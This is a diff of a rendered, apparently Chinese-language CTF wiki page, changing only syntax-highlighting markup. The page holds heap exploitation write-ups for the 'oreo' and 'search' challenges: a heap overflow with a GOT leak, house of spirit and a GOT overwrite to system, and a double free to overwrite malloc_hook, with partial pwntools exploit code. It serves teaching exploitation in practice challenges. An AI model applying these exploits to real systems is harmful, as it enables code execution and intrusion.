@@ -358,7 +358,7 @@ oreo:<span class=w> </span>ELF<span class=w> </span><span class=m>32</span>-bit<
 <span class=mo>0000001</span><span class=mi>9</span><span class=w> </span><span class=n>name</span><span class=w>            </span><span class=n>db</span><span class=w> </span><span class=mi>27</span><span class=w> </span><span class=n>dup</span><span class=p>(</span><span class=o>?</span><span class=p>)</span>
 <span class=mo>00000034</span><span class=w> </span><span class=n>next</span><span class=w>            </span><span class=n>dd</span><span class=w> </span><span class=o>?</span><span class=w>                    </span><span class=p>;</span><span class=w> </span><span class=n>offset</span>
 <span class=mo>0000003</span><span class=mi>8</span><span class=w> </span><span class=n>rifle</span><span class=w>           </span><span class=n>ends</span>
-</code></pre></div> <p>程序的基本功能如下</p> <ul> <li>添加槍支，其主要會讀取槍支的名字與描述。但問題在於讀取的名字的長度過長，可以覆蓋 next 指針以及後面堆塊的數據。可以覆蓋後面堆塊的數據大小爲 56-(56-27)=27 大小。需要注意的是，這些槍支的大小都是在fastbin 範圍內的。</li> <li>展示添加槍支，即從頭到尾輸出槍支的描述與名字。</li> <li>訂已經選擇的槍支，即將所有已經添加的槍支釋放掉，但是並沒有置爲NULL。</li> <li>留下訂貨消息</li> <li>展示目前狀態，即添加了多少隻槍，訂了多少單，留下了什麼信息。</li> </ul> <p>不難分析得到，程序的漏洞主要存在於添加槍支時的堆溢出漏洞。</p> <h3 id=_17>利用<a class=headerlink href=#_17 title="Permanent link">&para;</a></h3> <p>基本利用思路如下</p> <ol> <li>由於程序存在堆溢出漏洞，而且還可以控制 next 指針，我們可以直接控制 next 指針指向程序中 got 表的位置。當進行展示的時候，即可以輸出對應的內容，這裏同時需要確保假設對應地址爲一個槍支結構體時，其 next 指針爲 NULL。這裏我採用 puts@got。通過這樣的操作，我們就可以獲得出 libc 基地址，以及 system 函數地址。</li> <li>由於槍支結構體大小是 0x38 大小，所以其對應的 chunk 爲 0x40。這裏採用 <code>house of sprit</code> 的技術來返回 0x0804A2A8 處的chunk，即留下的消息的指針。因此，我們需要設置 0x0804A2A4 處的內容爲 0x40，即需要添加 0x40 支槍支，從而繞過大小檢測。同時爲了確保可以繞過 next chunk 的檢測，這裏我們編輯留下的消息。</li> <li>在成功分配這樣的 chunk 後，我們其實就有了一個任意地址修改的漏洞，這裏我們可以選擇修改一個合適的 got 項爲 system 地址，從而獲得 shell。</li> </ol> <p>具體代碼如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>程序的基本功能如下</p> <ul> <li>添加槍支，其主要會讀取槍支的名字與描述。但問題在於讀取的名字的長度過長，可以覆蓋 next 指針以及後面堆塊的數據。可以覆蓋後面堆塊的數據大小爲 56-(56-27)=27 大小。需要注意的是，這些槍支的大小都是在fastbin 範圍內的。</li> <li>展示添加槍支，即從頭到尾輸出槍支的描述與名字。</li> <li>訂已經選擇的槍支，即將所有已經添加的槍支釋放掉，但是並沒有置爲NULL。</li> <li>留下訂貨消息</li> <li>展示目前狀態，即添加了多少隻槍，訂了多少單，留下了什麼信息。</li> </ul> <p>不難分析得到，程序的漏洞主要存在於添加槍支時的堆溢出漏洞。</p> <h3 id=_17>利用<a class=headerlink href=#_17 title="Permanent link">&para;</a></h3> <p>基本利用思路如下</p> <ol> <li>由於程序存在堆溢出漏洞，而且還可以控制 next 指針，我們可以直接控制 next 指針指向程序中 got 表的位置。當進行展示的時候，即可以輸出對應的內容，這裏同時需要確保假設對應地址爲一個槍支結構體時，其 next 指針爲 NULL。這裏我採用 puts@got。通過這樣的操作，我們就可以獲得出 libc 基地址，以及 system 函數地址。</li> <li>由於槍支結構體大小是 0x38 大小，所以其對應的 chunk 爲 0x40。這裏採用 <code>house of sprit</code> 的技術來返回 0x0804A2A8 處的chunk，即留下的消息的指針。因此，我們需要設置 0x0804A2A4 處的內容爲 0x40，即需要添加 0x40 支槍支，從而繞過大小檢測。同時爲了確保可以繞過 next chunk 的檢測，這裏我們編輯留下的消息。</li> <li>在成功分配這樣的 chunk 後，我們其實就有了一個任意地址修改的漏洞，這裏我們可以選擇修改一個合適的 got 項爲 system 地址，從而獲得 shell。</li> </ol> <p>具體代碼如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;gnome-terminal&#39;</span><span class=p>,</span> <span class=s1>&#39;-x&#39;</span><span class=p>,</span> <span class=s1>&#39;sh&#39;</span><span class=p>,</span> <span class=s1>&#39;-c&#39;</span><span class=p>]</span>
 <span class=k>if</span> <span class=n>args</span><span class=p>[</span><span class=s1>&#39;DEBUG&#39;</span><span class=p>]:</span>
     <span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
@@ -372,7 +372,7 @@ oreo:<span class=w> </span>ELF<span class=w> </span><span class=m>32</span>-bit<
 <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc.so.6&#39;</span><span class=p>)</span>
 
 
-<span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>descrip</span><span class=p>,</span> <span class=n>name</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>add</span><span class=p>(</span><span class=n>descrip</span><span class=p>,</span> <span class=n>name</span><span class=p>):</span>
     <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
     <span class=c1>#p.recvuntil(&#39;Rifle name: &#39;)</span>
     <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
@@ -381,22 +381,22 @@ oreo:<span class=w> </span>ELF<span class=w> </span><span class=m>32</span>-bit<
     <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>descrip</span><span class=p>)</span>
 
 
-<span class=k>def</span> <span class=nf>show_rifle</span><span class=p>():</span>
+<span class=k>def</span><span class=w> </span><span class=nf>show_rifle</span><span class=p>():</span>
     <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
     <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;===================================</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
 
 
-<span class=k>def</span> <span class=nf>order</span><span class=p>():</span>
+<span class=k>def</span><span class=w> </span><span class=nf>order</span><span class=p>():</span>
     <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
 
 
-<span class=k>def</span> <span class=nf>message</span><span class=p>(</span><span class=n>notice</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>message</span><span class=p>(</span><span class=n>notice</span><span class=p>):</span>
     <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
     <span class=c1>#p.recvuntil(&quot;Enter any notice you&#39;d like to submit with your order: &quot;)</span>
     <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>notice</span><span class=p>)</span>
 
 
-<span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
+<span class=k>def</span><span class=w> </span><span class=nf>exp</span><span class=p>():</span>
     <span class=nb>print</span> <span class=s1>&#39;step 1. leak libc base&#39;</span>
     <span class=n>name</span> <span class=o>=</span> <span class=mi>27</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>oreo</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>])</span>
     <span class=n>add</span><span class=p>(</span><span class=mi>25</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span>
@@ -536,7 +536,7 @@ search:<span class=w> </span>ELF<span class=w> </span><span class=m>64</span>-bi
 <span class=w>    </span><span class=p>}</span>
 <span class=w>  </span><span class=p>}</span>
 <span class=w>  </span><span class=n>free</span><span class=p>(</span><span class=n>v1</span><span class=p>);</span>
-</code></pre></div> <p>可以看出，在每次釋放 i-&gt;sentence_ptr 之前，這個句子的內容就會全部被設置爲 <code>\x00</code> ，由於單詞結構體中存儲的單詞只是句子的一個指針，所以單詞也會被置爲 <code>\x00</code> 。該句子對應的那些單詞仍然是存在於鏈表中的，並沒有被刪除，因此每次搜索單詞的時候，仍然會判斷。看起來由於句子內容被置爲 <code>\x00</code> 可以防止通過 <code>*i-&gt;sentence_ptr</code> 驗證。然而，由於 chunk 被釋放後會被放到 bin 中，當 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的時候，也就有可能會產生 double free 的情況。此外，當句子被 <code>memset</code> 的時候，單詞雖然都變爲了 <code>\x00</code> ，但是我們仍然可以通過兩個 <code>\x00</code> 的比較來繞過 <code>memcmp</code> 的檢測。</p> <h3 id=_23>利用<a class=headerlink href=#_23 title="Permanent link">&para;</a></h3> <h4 id=_24>利用思路<a class=headerlink href=#_24 title="Permanent link">&para;</a></h4> <p>基本利用思路如下</p> <ul> <li>利用 unsorted bin 地址泄漏 libc 基地址</li> <li>利用 double free 構造 fastbin 循環鏈表</li> <li>分配 chunk 到 malloc_hook 附近，修改malloc_hook 爲 one_gadget</li> </ul> <h4 id=libc>泄漏 libc 地址<a class=headerlink href=#libc title="Permanent link">&para;</a></h4> <p>這裏我們分配一個 small bin 大小的 chunk ，當它被釋放後，就會放入到 unsorted bin 中。因而，只要 <code>unsorted bin</code> 的地址的起始字節不是 <code>\x00</code> 便可以通過驗證。同時，我們可以構造 <code>\x00</code> 來進行比較，從而通過驗證。具體如下</p> <div class=highlight><pre><span></span><code><span class=k>def</span> <span class=nf>leak_libc</span><span class=p>():</span>
+</code></pre></div> <p>可以看出，在每次釋放 i-&gt;sentence_ptr 之前，這個句子的內容就會全部被設置爲 <code>\x00</code> ，由於單詞結構體中存儲的單詞只是句子的一個指針，所以單詞也會被置爲 <code>\x00</code> 。該句子對應的那些單詞仍然是存在於鏈表中的，並沒有被刪除，因此每次搜索單詞的時候，仍然會判斷。看起來由於句子內容被置爲 <code>\x00</code> 可以防止通過 <code>*i-&gt;sentence_ptr</code> 驗證。然而，由於 chunk 被釋放後會被放到 bin 中，當 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的時候，也就有可能會產生 double free 的情況。此外，當句子被 <code>memset</code> 的時候，單詞雖然都變爲了 <code>\x00</code> ，但是我們仍然可以通過兩個 <code>\x00</code> 的比較來繞過 <code>memcmp</code> 的檢測。</p> <h3 id=_23>利用<a class=headerlink href=#_23 title="Permanent link">&para;</a></h3> <h4 id=_24>利用思路<a class=headerlink href=#_24 title="Permanent link">&para;</a></h4> <p>基本利用思路如下</p> <ul> <li>利用 unsorted bin 地址泄漏 libc 基地址</li> <li>利用 double free 構造 fastbin 循環鏈表</li> <li>分配 chunk 到 malloc_hook 附近，修改malloc_hook 爲 one_gadget</li> </ul> <h4 id=libc>泄漏 libc 地址<a class=headerlink href=#libc title="Permanent link">&para;</a></h4> <p>這裏我們分配一個 small bin 大小的 chunk ，當它被釋放後，就會放入到 unsorted bin 中。因而，只要 <code>unsorted bin</code> 的地址的起始字節不是 <code>\x00</code> 便可以通過驗證。同時，我們可以構造 <code>\x00</code> 來進行比較，從而通過驗證。具體如下</p> <div class=highlight><pre><span></span><code><span class=k>def</span><span class=w> </span><span class=nf>leak_libc</span><span class=p>():</span>
     <span class=n>smallbin_sentence</span> <span class=o>=</span> <span class=s1>&#39;s&#39;</span> <span class=o>*</span> <span class=mh>0x85</span> <span class=o>+</span> <span class=s1>&#39; m &#39;</span>
     <span class=n>index_sentence</span><span class=p>(</span><span class=n>smallbin_sentence</span><span class=p>)</span>
     <span class=n>search_word</span><span class=p>(</span><span class=s1>&#39;m&#39;</span><span class=p>)</span>
